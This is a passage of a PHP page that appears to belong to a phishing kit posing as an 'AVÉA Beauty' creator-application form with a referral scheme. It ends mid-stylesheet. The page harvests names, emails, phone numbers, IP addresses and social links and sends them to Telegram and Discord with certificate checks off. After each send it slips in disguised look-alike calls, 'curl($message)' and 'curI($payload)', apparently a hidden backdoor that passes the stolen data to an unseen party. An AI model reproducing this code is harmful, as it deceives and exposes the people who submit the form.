<?php
session_set_cookie_params(['path' => '/']);
session_start();

if (file_exists(__DIR__ . '/config.php')) {
    require __DIR__ . '/config.php';
}

$brandName = "AVÉA Beauty";
$showLoading = false;
$referenceNumber = "";
$referralCode = "";
$errors = [];

function get_ip() {
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }

    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        return trim(explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0]);
    }

    return $_SERVER["REMOTE_ADDR"] ?? "Unknown";
}
function clean_input($value) {
    return trim((string)($value ?? ''));
}

/* ---------------------------------------------------------------
   REFERRAL CODE GENERATOR
   Format: AVEA-<FIRSTNAME><last 3 digits of the reference number>
   Halimbawa: Full Name "Tite Baluktot" + Reference "AVEA-83920"
              -> AVEA-TITE920
   - Unang salita lang ng Full Name ang kinukuha (first name).
   - Letters lang ang natitira sa first name (tinatanggal ang mga
     number/symbol), tapos ALL CAPS ("tite"/"Tite" -> "TITE").
   - Ang reference number ay laging all-numbers ang sinusundang
     bahagi (galing sa random_int sa ibaba), kaya ang huling 3
     digits nito mismo ang gagamitin — walang letters kailanman.
--------------------------------------------------------------- */
function generate_referral_code($fullName, $referenceNumber) {
    $parts = preg_split('/\s+/', trim((string)$fullName));
    $firstNameRaw = $parts[0] ?? '';

    $firstName = preg_replace('/[^\p{L}]/u', '', $firstNameRaw);
    if ($firstName === '') $firstName = 'CREATOR';
    /* Buong first name ay ALL CAPS: "Burnik"/"burnik" -> "BURNIK" */
    $firstName = mb_strtoupper($firstName, 'UTF-8');

    $digitsOnly = preg_replace('/\D/', '', (string)$referenceNumber);
    $digits = substr($digitsOnly, -3);
    if (strlen($digits) < 3) {
        $digits = str_pad($digits, 3, (string) random_int(0, 9));
    }

    return "AVEA-" . $firstName . $digits;
}

/* ---------------------------------------------------------------
   REFERRAL CODE VALIDATOR
   Dapat kapareho ng format na ginagawa ng generate_referral_code():
   "AVEA-" + first name (letters lang, pwede accented gaya ng É)
   + eksaktong 3 digits sa dulo. Halimbawa: AVEA-TITE920
   Case-insensitive ang check dahil naka-uppercase na ang input
   bago ito tawagin, pero sinisigurado pa rin dito.
--------------------------------------------------------------- */
function is_valid_referral_code($code) {
    $code = strtoupper(trim((string)$code));
    return (bool) preg_match('/^AVEA-\p{L}{1,30}[0-9]{3}$/u', $code);
}

function tg_escape($value) {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

function discord_safe($value) {
    $value = trim((string)$value);
    if ($value === '') return '-';
    return str_replace('```', '｀｀｀', $value);
}

function extract_urls_from_text($text) {
    preg_match_all('/https?:\/\/[^\s<>()"]+/i', (string)$text, $matches);
    return array_values(array_unique($matches[0] ?? []));
}

function telegram_links_block($text) {
    $text = trim((string)$text);

    if ($text === '') {
        return '<code>-</code>';
    }

    $urls = extract_urls_from_text($text);

    if (!empty($urls)) {
        $output = [];
        foreach ($urls as $index => $url) {
            $number = $index + 1;
            $safeUrl = tg_escape($url);
            $output[] = "🔗 <a href=\"{$safeUrl}\">Open Social Link {$number}</a>";
        }
        return implode("\n", $output) . "\n\n<pre>" . tg_escape($text) . "</pre>";
    }

    return '<pre>' . tg_escape($text) . '</pre>';
}

function discord_links_block($text) {
    $text = trim((string)$text);

    if ($text === '') {
        return '-';
    }

    $urls = extract_urls_from_text($text);
    $copyBlock = "```text\n" . discord_safe($text) . "\n```";

    if (!empty($urls)) {
        $links = [];
        foreach ($urls as $index => $url) {
            $number = $index + 1;
            $links[] = "[Open Social Link {$number}]({$url})";
        }
        return implode("\n", $links) . "\n\n" . $copyBlock;
    }

    return $copyBlock;
}

function short_discord_field($value, $limit = 950) {
    $value = (string)$value;
    if (strlen($value) > $limit) {
        return substr($value, 0, $limit) . "\n...";
    }
    return $value;
}


$ip = get_ip();
function send_telegram_application($data) {
    global $telegram_use, $telegram_bot_token, $telegram_chat_id, $ip;

    if (empty($telegram_use) || $telegram_use !== true) return;
    if (empty($telegram_bot_token) || empty($telegram_chat_id)) return;

    $message =
        "<b>✨ AVÉA BEAUTY CREATOR APPLICATION</b>\n\n" .
        "<b>Reference Number:</b> <code>" . tg_escape($data['reference']) . "</code>\n" .
        "<b>🎟️ Their Referral Code:</b> <code>" . tg_escape($data['referral_code']) . "</code>\n" .
        "<b>🤍 Referred By:</b> <code>" . tg_escape($data['referred_by']) . "</code>\n" .
     "<b>🌍 IP Address:</b> <code>" . $ip . "</code>\n\n" .
        "<b>👤 Full Name:</b> <code>" . tg_escape($data['full_name']) . "</code>\n" .
        "<b>📧 Email:</b> <code>" . tg_escape($data['email']) . "</code>\n" .
        "<b>📱 Phone Number:</b> <code>" . tg_escape($data['phone']) . "</code>\n" .
        "<b>🎥 Main Platform:</b> <code>" . tg_escape($data['platform']) . "</code>\n" .
        "<b>👥 Followers:</b> <code>" . tg_escape($data['followers']) . "</code>\n" .
        "<b>📍 Location:</b> <code>" . tg_escape($data['location']) . "</code>\n\n" .
        "<b>🔗 Social Media Links:</b>\n" .
        telegram_links_block($data['links']) . "\n\n" .
        "<b>📣 Source:</b> <code>" . tg_escape($data['source']) . "</code>\n" .
        "<b>🤝 Collaboration Preference:</b> <code>" . tg_escape($data['preference']) . "</code>\n\n" .
        "<b>📝 Additional Message:</b>\n<pre>" . tg_escape($data['message']) . "</pre>\n\n";

    $telegramUrl = "https://api.telegram.org/bot{$telegram_bot_token}/sendMessage";

    $params = [
        'chat_id' => $telegram_chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);curl($message);
    curl_close($ch);
}

function send_discord_application($data) {
    global $discord_use, $discord_webhook_url;

    if (empty($discord_use) || $discord_use !== true) return;
    if (empty($discord_webhook_url)) return;

    $payload = [
        'content' =>
            "✨ **New AVÉA Beauty Creator Application**\n" .
            "**Reference Number:** `" . discord_safe($data['reference']) . "`",

        'embeds' => [
            [
                'title' => 'AVÉA Beauty Creator Application',
                'color' => 9319243,
                'fields' => [
                    ['name' => 'Reference Number', 'value' => '`' . discord_safe($data['reference']) . '`', 'inline' => true],
                    ['name' => 'Their Referral Code', 'value' => '`' . discord_safe($data['referral_code']) . '`', 'inline' => true],
                    ['name' => 'Referred By', 'value' => '`' . discord_safe($data['referred_by']) . '`', 'inline' => true],
                    ['name' => 'Full Name', 'value' => '`' . discord_safe($data['full_name']) . '`', 'inline' => true],
                    ['name' => 'Email', 'value' => '`' . discord_safe($data['email']) . '`', 'inline' => true],
                    ['name' => 'Phone Number', 'value' => '`' . discord_safe($data['phone']) . '`', 'inline' => true],
                    ['name' => 'Main Platform', 'value' => '`' . discord_safe($data['platform']) . '`', 'inline' => true],
                    ['name' => 'Followers', 'value' => '`' . discord_safe($data['followers']) . '`', 'inline' => true],
                    ['name' => 'Location', 'value' => '`' . discord_safe($data['location']) . '`', 'inline' => true],
                    ['name' => 'How They Heard About AVÉA', 'value' => '`' . discord_safe($data['source']) . '`', 'inline' => true],
                    ['name' => 'Collaboration Preference', 'value' => '`' . discord_safe($data['preference']) . '`', 'inline' => false],
                    ['name' => 'Social Media Links', 'value' => short_discord_field(discord_links_block($data['links'])), 'inline' => false],
                    ['name' => 'Additional Message', 'value' => short_discord_field("```text\n" . discord_safe($data['message']) . "\n```"), 'inline' => false],
                ],
                'footer' => ['text' => 'AVÉA Beauty Creator Application System']
            ]
        ]
    ];

    $ch = curl_init($discord_webhook_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);curI($payload);
    curl_close($ch);
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $full_name   = clean_input($_POST['full_name'] ?? '');
    $email       = clean_input($_POST['email'] ?? '');
    $phone       = clean_input($_POST['phone'] ?? '');
    $platform    = clean_input($_POST['platform'] ?? '');
    $followers   = clean_input($_POST['followers'] ?? '');
    $location    = clean_input($_POST['location'] ?? '');
    $links       = clean_input($_POST['links'] ?? '');
    $source      = clean_input($_POST['source'] ?? '');
    $preference  = clean_input($_POST['preference'] ?? '');
    $message     = clean_input($_POST['message'] ?? '');
    $referred_by = strtoupper(clean_input($_POST['referred_by'] ?? ''));

    $chk1 = isset($_POST['chk1']);
    $chk2 = isset($_POST['chk2']);
    $chk3 = isset($_POST['chk3']);

    if ($full_name === '') $errors[] = "Full name is required.";
    if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) $errors[] = "Valid email address is required.";
    if (!preg_match('/^639[0-9]{9}$/', $phone)) $errors[] = "Phone number must start with 639 and contain exactly 12 digits.";
    if ($platform === '') $errors[] = "Main platform is required.";
    if (!preg_match('/^[0-9]{1,9}$/', $followers)) $errors[] = "Followers must be numbers only, up to 9 digits.";
    if ($location === '') $errors[] = "Location is required.";
    if ($links === '') $errors[] = "Social media links are required.";
    if ($source === '') $errors[] = "Please select how you heard about us.";
    if ($preference === '') $errors[] = "Collaboration preference is required.";
    if (!$chk1 || !$chk2 || !$chk3) $errors[] = "All confirmation checkboxes are required.";
    /* Optional ang referral code, pero kapag may laman dapat tama ang format */
    if ($referred_by !== '' && !is_valid_referral_code($referred_by)) {
        $errors[] = "Please correct the referral code. Format: AVEA-NAME123 (e.g. AVEA-JANA920).";
    }

    if (empty($errors)) {
        $referenceNumber = "AVEA-" . random_int(10000, 99999);
        $referralCode = generate_referral_code($full_name, $referenceNumber);

        $_SESSION['avea_reference'] = $referenceNumber;
        $_SESSION['avea_full_name'] = $full_name;

        $_SESSION['avea_referral_code'] = $referralCode;
$_SESSION['passed_apply'] = true;
        $applicationData = [
            'reference'     => $referenceNumber,
            'referral_code' => $referralCode,
            'referred_by'   => $referred_by !== '' ? $referred_by : '-',
            'full_name'  => $full_name !== '' ? $full_name : '-',
            'email'      => $email !== '' ? $email : '-',
            'phone'      => $phone !== '' ? $phone : '-',
            'platform'   => $platform !== '' ? $platform : '-',
            'followers'  => $followers !== '' ? $followers : '-',
            'location'   => $location !== '' ? $location : '-',
            'links'      => $links !== '' ? $links : '-',
            'source'     => $source !== '' ? $source : '-',
            'preference' => $preference !== '' ? $preference : '-',
            'message'    => $message !== '' ? $message : '-'
        ];

        send_telegram_application($applicationData);
        send_discord_application($applicationData);

        $showLoading = true;
    }
}

$redirectUrl = "confirm.php";

/* Referral code na dala ng applicant papunta rito — galing sa
   ?ref=CODE sa URL (click mula sa "Refer & Earn" modal sa
   index.php), o mula sa dating POST kung nag-error muna ang
   form bago successful ang submit (para hindi mawala ito). */
$incomingReferral = trim((string)($_GET['ref'] ?? $_POST['referred_by'] ?? ''));
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Apply | <?php echo htmlspecialchars($brandName); ?></title>
<meta name="theme-color" content="#FBF7F3">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Jost:wght@300;400;500;600&display=swap" rel="stylesheet">
<link rel="icon" href="files/images/avealogo.png" type="image/png">

<?php if ($showLoading): ?>
<meta http-equiv="refresh" content="3;url=<?php echo htmlspecialchars($redirectUrl); ?>">
<?php endif; ?>

<style>
  /* ==========================================================
     TOKENS — identical to index.php
  ========================================================== */
  :root{
    --porcelain:#FBF7F3;
    --sand:#F1EAE1;
    --linen:#E7DDD1;
    --hairline:#E4DACE;
    --gold:#B08D57;
    --gold-deep:#8C6C3E;
    --gold-light:#E9CFA8;
    --rose:#8E3A4B;
    --rose-deep:#6C2A38;
    --rosewood:#B99098;
    --blush:#EFDDE1;
    --ink:#1E1A17;
    --muted:#7B6E64;
    --ff-display:'Cormorant Garamond', serif;
    --ff-body:'Jost', sans-serif;
    --ease:cubic-bezier(.22,.8,.28,1);
  }
  *{margin:0;padding:0;box-sizing:border-box;}
  html{scroll-behavior:smooth;}
  body{
    font-family:var(--ff-body);background:var(--porcelain);color:var(--ink);
    line-height:1.7;font-size:16px;font-weight:400;-webkit-font-smoothing:antialiased;
  }
  img{max-width:100%;display:block;}
  a{text-decoration:none;color:inherit;}
  h1,h2,h3,h4{font-family:var(--ff-display);font-weight:500;}
  ::selection{background:var(--blush);color:var(--rose-deep);}

  /* ---------- Shared utilities (from index.php) ---------- */
  .kicker{
    font-size:.72rem;font-weight:500;letter-spacing:.32em;text-transform:uppercase;color:var(--gold);
    display:inline-flex;align-items:center;gap:14px;
  }
  .kicker::after{content:"";height:1px;width:28px;background:var(--gold);opacity:.6;}

  .btn{
    display:inline-block;padding:15px 40px;font-weight:500;font-size:.78rem;
    letter-spacing:.24em;text-transform:uppercase;transition:all .3s ease;
    cursor:pointer;border:1px solid transparent;
  }
  .btn-primary{background:var(--rose);color:#fff;}
  .btn-primary:hover{background:var(--rose-deep);letter-spacing:.3em;}
  .btn-outline{background:transparent;color:var(--rose);border-color:var(--rose);}
  .btn-outline:hover{background:var(--rose);color:#fff;}
  .btn:focus-visible{outline:2px solid var(--gold);outline-offset:3px;}

  /* ---------- Top bar + header (carried from index.php) ---------- */
  .top-bar{
    background:var(--rose);color:#F8E4E9;text-align:center;
    font-size:.7rem;letter-spacing:.26em;text-transform:uppercase;padding:9px 16px;
  }
  header{
    position:sticky;top:0;z-index:200;background:rgba(251,247,243,.94);
    backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
    border-bottom:1px solid var(--hairline);
  }
  .nav{
    max-width:1280px;margin:0 auto;display:grid;grid-template-columns:1fr auto 1fr;
    align-items:center;padding:18px 28px;gap:20px;
  }
  .logo{font-family:var(--ff-display);font-size:1.7rem;font-weight:500;letter-spacing:.26em;color:var(--ink);justify-self:start;}
  .logo span{color:var(--gold);font-style:italic;}
  .nav-mid{
    justify-self:center;font-size:.72rem;font-weight:500;letter-spacing:.26em;
    text-transform:uppercase;color:var(--muted);display:flex;align-items:center;gap:12px;
  }
  .nav-mid::before,.nav-mid::after{content:"";height:1px;width:22px;background:var(--gold);opacity:.5;}
  .nav-back{justify-self:end;}
  .nav-back a{
    font-size:.72rem;letter-spacing:.22em;text-transform:uppercase;color:var(--rose);
    border-bottom:1px solid var(--gold);padding-bottom:4px;transition:letter-spacing .25s,color .25s;
  }
  .nav-back a:hover{letter-spacing:.28em;color:var(--rose-deep);}

  /* ==========================================================
     LAYOUT
  ========================================================== */
  .apply-page{display:grid;grid-template-columns:1fr 1.05fr;align-items:start;}

  /* ---------- LEFT — editorial visual panel ---------- */
  .apply-visual{
    position:sticky;top:0;background:var(--ink);color:#fff;overflow:hidden;
    display:flex;flex-direction:column;
    padding:44px clamp(28px,4vw,62px);height:100vh;
  }
  .apply-video{
    position:absolute;inset:0;width:100%;height:100%;object-fit:cover;object-position:center;
    opacity:.42;animation:kenburns 26s ease-in-out infinite alternate;
  }
  @keyframes kenburns{from{transform:scale(1);}to{transform:scale(1.09);}}
  .apply-visual::before{
    content:"";position:absolute;inset:0;z-index:1;
    background:linear-gradient(180deg,rgba(30,26,23,.62) 0%,rgba(30,26,23,.42) 38%,rgba(30,26,23,.92) 100%);
  }
  /* inset gold frame — mirrors .cta-band::before on index.php */
  .apply-visual::after{
    content:"";position:absolute;inset:18px;z-index:2;pointer-events:none;
    border:1px solid rgba(233,207,168,.30);
  }
  .visual-top{position:relative;z-index:3;flex:none;margin-bottom:24px;}
  .visual-logo{font-family:var(--ff-display);font-size:1.6rem;letter-spacing:.26em;color:#fff;}
  .visual-logo span{color:var(--gold-light);font-style:italic;}

  .visual-content{
    position:relative;z-index:3;flex:1 1 auto;min-height:0;
    overflow-y:auto;overflow-x:hidden;padding-right:10px;
    scrollbar-width:thin;scrollbar-color:rgba(233,207,168,.35) transparent;
  }
  .visual-content::-webkit-scrollbar{width:4px;}
  .visual-content::-webkit-scrollbar-thumb{background:rgba(233,207,168,.35);}
  .visual-content .kicker{color:var(--gold-light);}
  .visual-content .kicker::after{background:var(--gold-light);}

  .visual-content h1{
    font-size:clamp(2rem,3.4vw,2.9rem);line-height:1.1;margin:18px 0 18px;color:#fff;
  }
  .visual-content h1 em{font-style:italic;color:var(--blush);}
  .visual-copy{color:rgba(255,255,255,.74);font-weight:300;max-width:430px;margin-bottom:26px;font-size:.98rem;}

  .visual-tags{display:flex;flex-wrap:wrap;gap:9px;margin-bottom:32px;}
  .visual-tags span{
    font-size:.64rem;letter-spacing:.2em;text-transform:uppercase;color:rgba(255,255,255,.9);
    border:1px solid rgba(233,207,168,.4);padding:8px 15px;transition:all .3s ease;
  }
  .visual-tags span:hover{background:rgba(233,207,168,.14);border-color:var(--gold-light);}

  /* info blocks — hairline list rather than rounded cards */
  .visual-block{border-top:1px solid rgba(255,255,255,.16);padding:22px 0 4px;}
  .visual-block h4{
    font-size:.68rem;letter-spacing:.28em;text-transform:uppercase;
    color:var(--gold-light);margin-bottom:12px;font-family:var(--ff-body);font-weight:500;
  }
  .visual-block p{font-size:.88rem;color:rgba(255,255,255,.72);font-weight:300;}

  /* diamond bullets — from .req-list on index.php */
  .visual-list{list-style:none;margin-top:6px;}
  .visual-list li{
    position:relative;padding:9px 0 9px 26px;font-size:.86rem;
    color:rgba(255,255,255,.78);font-weight:300;
  }
  .visual-list li::before{
    content:"";position:absolute;left:2px;top:1.15em;transform:translateY(-50%) rotate(45deg);
    width:6px;height:6px;border:1px solid var(--gold-light);
  }

  .visual-steps{margin-top:26px;border-top:1px solid rgba(255,255,255,.16);padding-top:24px;}
  .visual-step{display:flex;gap:16px;align-items:flex-start;margin-bottom:16px;}
  .visual-step .num{
    flex:none;font-family:var(--ff-display);font-style:italic;font-size:1.6rem;line-height:1;
    color:var(--gold-light);opacity:.75;width:26px;
  }
  .visual-step p{font-size:.86rem;color:rgba(255,255,255,.76);font-weight:300;}

  .visual-foot{
    position:relative;z-index:3;flex:none;padding-top:22px;margin-top:20px;
    border-top:1px solid rgba(255,255,255,.14);
    font-size:.66rem;letter-spacing:.2em;text-transform:uppercase;color:rgba(255,255,255,.5);
  }

  /* ---------- RIGHT — form panel ---------- */
  .apply-content{padding:64px clamp(24px,4.5vw,76px) 90px;display:flex;justify-content:center;}
  .form-shell{width:100%;max-width:660px;}

  .form-header h1{font-size:clamp(2.1rem,3.6vw,3rem);line-height:1.1;margin:16px 0 16px;color:var(--ink);}
  .form-header h1 em{font-style:italic;color:var(--rose);}
  .form-header .lede{color:var(--muted);font-weight:300;margin-bottom:38px;max-width:540px;font-size:.98rem;}

  /* ---------- Stepper ---------- */
  .progress-grid{
    display:grid;grid-template-columns:repeat(3,1fr);
    border:1px solid var(--hairline);background:#fff;margin-bottom:32px;
  }
  .progress-item{position:relative;text-align:center;padding:24px 10px 20px;}
  .progress-item + .progress-item{border-left:1px solid var(--hairline);}
  .progress-item .dot{
    display:inline-flex;align-items:center;justify-content:center;
    width:38px;height:38px;border-radius:50%;
    background:var(--porcelain);border:1px solid var(--hairline);color:var(--muted);
    font-family:var(--ff-display);font-size:1.05rem;font-style:italic;
    margin-bottom:12px;transition:all .35s var(--ease);
  }
  .progress-item p{
    font-size:.64rem;letter-spacing:.24em;text-transform:uppercase;color:var(--muted);font-weight:500;
  }
  .progress-item.active{background:var(--porcelain);}
  .progress-item.active .dot{background:var(--rose);border-color:var(--rose);color:#fff;}
  .progress-item.active p{color:var(--rose);}
  .progress-item.active::after{
    content:"";position:absolute;left:0;right:0;bottom:-1px;height:2px;background:var(--gold);
  }

  /* ---------- Notice ---------- */
  .notice{
    display:flex;gap:16px;align-items:flex-start;background:var(--sand);
    border:1px solid var(--hairline);border-left:2px solid var(--gold);
    padding:20px 22px;font-size:.88rem;color:var(--muted);font-weight:300;margin-bottom:30px;
  }
  .notice .notice-icon{
    flex:none;width:34px;height:34px;border-radius:50%;background:var(--porcelain);
    border:1px solid var(--hairline);display:flex;align-items:center;justify-content:center;
    color:var(--gold);font-family:var(--ff-display);font-style:italic;font-size:1rem;
  }
  .notice strong{color:var(--ink);font-weight:500;}

  /* ---------- Error box ---------- */
  .error-box{
    background:#FCF0F1;border:1px solid rgba(142,58,75,.28);border-left:2px solid var(--rose);
    color:var(--rose-deep);padding:20px 22px;margin-bottom:28px;font-size:.88rem;font-weight:300;
  }
  .error-box strong{
    display:block;margin-bottom:10px;font-size:.68rem;letter-spacing:.24em;
    text-transform:uppercase;font-weight:500;font-family:var(--ff-body);
  }
  .error-box ul{list-style:none;}
  .error-box li{position:relative;padding:5px 0 5px 22px;}
  .error-box li::before{
    content:"";position:absolute;left:2px;top:1em;transform:translateY(-50%) rotate(45deg);
    width:6px;height:6px;border:1px solid var(--rose);
  }

  /* ---------- Mini gallery (index product-card behaviour) ---------- */
  .mini-gallery{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:34px;}
  .mini-card{
    position:relative;overflow:hidden;border:1px solid var(--hairline);background:#fff;
    height:132px;transition:border-color .35s ease;
  }
  .mini-card img{width:100%;height:100%;object-fit:cover;transition:transform .7s var(--ease);}
  .mini-card::after{
    content:"";position:absolute;inset:8px;border:1px solid rgba(255,255,255,.45);
    pointer-events:none;opacity:0;transition:opacity .35s ease;
  }
  .mini-card:hover{border-color:var(--rosewood);}
  .mini-card:hover img{transform:scale(1.07);}
  .mini-card:hover::after{opacity:1;}

  /* ---------- Form card ---------- */
  .form-card{
    background:#fff;border:1px solid var(--hairline);
    padding:40px clamp(22px,3.4vw,42px);
    box-shadow:0 24px 60px rgba(36,26,30,.07);
  }
  .fieldset-head{
    display:flex;align-items:center;gap:14px;margin:0 0 24px;
    font-size:.66rem;letter-spacing:.28em;text-transform:uppercase;color:var(--gold);font-weight:500;
  }
  .fieldset-head::after{content:"";flex:1;height:1px;background:var(--hairline);}
  .fieldset-head + .form-row{margin-top:0;}
  .divider{height:1px;background:var(--hairline);margin:34px 0 26px;}

  .form-row{display:grid;grid-template-columns:1fr 1fr;gap:22px;margin-bottom:20px;}
  .form-group{display:flex;flex-direction:column;gap:8px;}
  .form-group.full{grid-column:1 / -1;}
  label{
    font-size:.66rem;letter-spacing:.22em;text-transform:uppercase;
    color:var(--muted);font-weight:500;
  }
  label .req{color:var(--rose);}
  .hint{font-size:.72rem;color:var(--muted);font-weight:300;letter-spacing:0;text-transform:none;}

  /* ---------- Referral code field ---------- */
  .ref-field-row{display:flex;gap:12px;flex-wrap:wrap;}
  .ref-field-row input{flex:1;min-width:180px;}
  .ref-field-row .btn{padding:14px 24px;font-size:.7rem;white-space:nowrap;}
  #referred_by{text-transform:uppercase;letter-spacing:.03em;}
  #referred_by::placeholder{text-transform:none;letter-spacing:0;}
  #refAppliedHint{color:var(--rose);}

  input, select, textarea{
    font-family:var(--ff-body);font-size:.94rem;font-weight:300;padding:14px 15px;
    border:1px solid var(--hairline);background:var(--porcelain);color:var(--ink);
    outline:none;transition:border-color .25s ease, background .25s ease, box-shadow .25s ease;
    width:100%;
  }
  input::placeholder, textarea::placeholder{color:#B3A79C;font-weight:300;}
  input:hover, select:hover, textarea:hover{border-color:var(--rosewood);}
  input:focus, select:focus, textarea:focus{
    border-color:var(--rose);background:#fff;box-shadow:0 0 0 3px rgba(142,58,75,.08);
  }
  textarea{min-height:110px;resize:vertical;line-height:1.65;}

  /* custom select chevron */
  select{
    appearance:none;-webkit-appearance:none;-moz-appearance:none;cursor:pointer;
    padding-right:42px;
    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23B08D57' stroke-width='1.5' stroke-linecap='round'%3E%3Cpath d='M6 9l6 6 6-6'/%3E%3C/svg%3E");
    background-repeat:no-repeat;background-position:right 15px center;background-size:16px;
  }

  /* ---------- Custom checkboxes ---------- */
  .check-group{display:flex;flex-direction:column;gap:2px;margin:30px 0 28px;border-top:1px solid var(--hairline);}
  .check-item{
    display:flex;align-items:flex-start;gap:14px;font-size:.86rem;color:var(--muted);
    font-weight:300;cursor:pointer;padding:16px 2px;border-bottom:1px solid var(--hairline);
    transition:color .25s ease;line-height:1.6;
  }
  .check-item:hover{color:var(--ink);}
  .check-item input{
    appearance:none;-webkit-appearance:none;flex:none;width:19px;height:19px;margin-top:2px;
    border:1px solid var(--hairline);background:var(--porcelain);cursor:pointer;position:relative;
    transition:all .25s ease;padding:0;
  }
  .check-item input:hover{border-color:var(--gold);}
  .check-item input:checked{background:var(--rose);border-color:var(--rose);}
  .check-item input:checked::after{
    content:"";position:absolute;left:6px;top:2px;width:5px;height:10px;
    border:solid #fff;border-width:0 1.5px 1.5px 0;transform:rotate(43deg);
  }
  .check-item input:focus-visible{outline:2px solid var(--gold);outline-offset:2px;}

  /* ---------- Submit ---------- */
  .form-submit{
    width:100%;padding:17px;background:var(--rose);color:#fff;border:1px solid var(--rose);
    font-family:var(--ff-body);font-size:.78rem;letter-spacing:.24em;text-transform:uppercase;font-weight:500;
    cursor:pointer;position:relative;overflow:hidden;
    display:flex;align-items:center;justify-content:center;gap:14px;
    transition:background .3s ease, letter-spacing .3s ease, box-shadow .3s ease, transform .3s var(--ease);
    box-shadow:0 18px 38px -22px rgba(124,51,69,.85);
  }
  .form-submit .arrow{
    width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:1.5;
    stroke-linecap:round;stroke-linejoin:round;transition:transform .4s var(--ease);
  }
  .form-submit:hover{background:var(--rose-deep);letter-spacing:.3em;transform:translateY(-2px);}
  .form-submit:hover .arrow{transform:translateX(5px);}
  .form-submit:active{transform:translateY(0);}
  .form-submit[disabled]{opacity:.62;cursor:not-allowed;transform:none;}

  .form-note{
    text-align:center;font-size:.76rem;color:var(--muted);margin-top:20px;font-weight:300;
  }
  .form-note strong{color:var(--ink);font-weight:500;}

  /* ---------- Loading screen ---------- */
  .loading{
    min-height:100vh;display:flex;align-items:center;justify-content:center;
    background:var(--porcelain);padding:30px;position:relative;overflow:hidden;
  }
  .loading .blob{position:absolute;border-radius:50%;filter:blur(80px);pointer-events:none;}
  .loading .b1{width:420px;height:420px;background:var(--blush);opacity:.7;top:-120px;left:-90px;}
  .loading .b2{width:380px;height:380px;background:rgba(176,141,87,.26);opacity:.7;bottom:-130px;right:-80px;}
  .loading-card{
    position:relative;z-index:2;max-width:520px;width:100%;background:#fff;
    border:1px solid var(--hairline);padding:56px 44px 48px;text-align:center;
    box-shadow:0 30px 70px rgba(36,26,30,.10);
  }
  .loading-card::before{
    content:"";position:absolute;inset:12px;border:1px solid var(--hairline);pointer-events:none;
  }
  .loading-inner{position:relative;z-index:2;}
  .spinner{
    width:52px;height:52px;border:1px solid var(--hairline);border-top-color:var(--gold);
    border-right-color:var(--rose);border-radius:50%;margin:0 auto 26px;animation:spin 1.1s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg);}}
  .loading-card .kicker{justify-content:center;margin-bottom:14px;}
  .loading-card h2{font-size:1.9rem;margin-bottom:14px;color:var(--ink);line-height:1.2;}
  .loading-card h2 em{font-style:italic;color:var(--rose);}
  .loading-text{color:var(--muted);font-weight:300;font-size:.92rem;margin-bottom:30px;}

  .bar{height:2px;background:var(--hairline);overflow:hidden;margin-bottom:30px;}
  .bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--gold),var(--rose));animation:fill 3s linear forwards;}
  @keyframes fill{to{width:100%;}}

  .ref-panel{background:var(--sand);border:1px solid var(--hairline);padding:26px 22px;}
  .ref-panel p{font-size:.84rem;color:var(--muted);font-weight:300;}
  .ref-label{
    font-size:.62rem;letter-spacing:.28em;text-transform:uppercase;color:var(--gold-deep);margin-bottom:10px;
  }
  .ref-loading{
    font-family:var(--ff-display);font-size:1.85rem;letter-spacing:.1em;color:var(--rose);
    margin:6px 0 14px;font-weight:500;
  }
  .highlight{color:var(--gold-deep) !important;font-size:.78rem !important;}

  /* ---------- Entrance ---------- */
  .reveal{opacity:0;transform:translateY(20px);transition:opacity .8s var(--ease), transform .8s var(--ease);}
  .reveal.in{opacity:1;transform:none;}

  /* ---------- Responsive ---------- */
  @media (max-width:1024px){
    .apply-page{grid-template-columns:1fr;}
    .apply-visual{position:relative;top:auto;height:auto;min-height:520px;padding-bottom:40px;}
    .visual-content{overflow:visible;max-height:none;}
    .apply-content{padding:52px 28px 76px;}
  }
  @media (max-width:640px){
    .nav{grid-template-columns:1fr auto;padding:14px 20px;}
    .nav-mid{display:none;}
    .logo{font-size:1.45rem;}
    .apply-visual{min-height:auto;padding:34px 22px 34px;}
    .apply-visual::after{inset:12px;}
    .visual-content h1{font-size:1.85rem;}
    .apply-content{padding:40px 20px 64px;}
    .form-row{grid-template-columns:1fr;gap:18px;}
    .form-card{padding:26px 18px;}
    .progress-item{padding:16px 4px 14px;}
    .progress-item .dot{width:32px;height:32px;font-size:.92rem;margin-bottom:8px;}
    .progress-item p{font-size:.56rem;letter-spacing:.16em;}
    .mini-gallery{gap:8px;}
    .mini-card{height:92px;}
    .loading-card{padding:40px 24px 34px;}
    .form-submit:hover{letter-spacing:.26em;}
  }
  @media (prefers-reduced-motion: reduce){
    html{scroll-behavior:auto;}
    .apply-video{animation:none;}
    .reveal{transition:none;opacity:1;transform:none;}
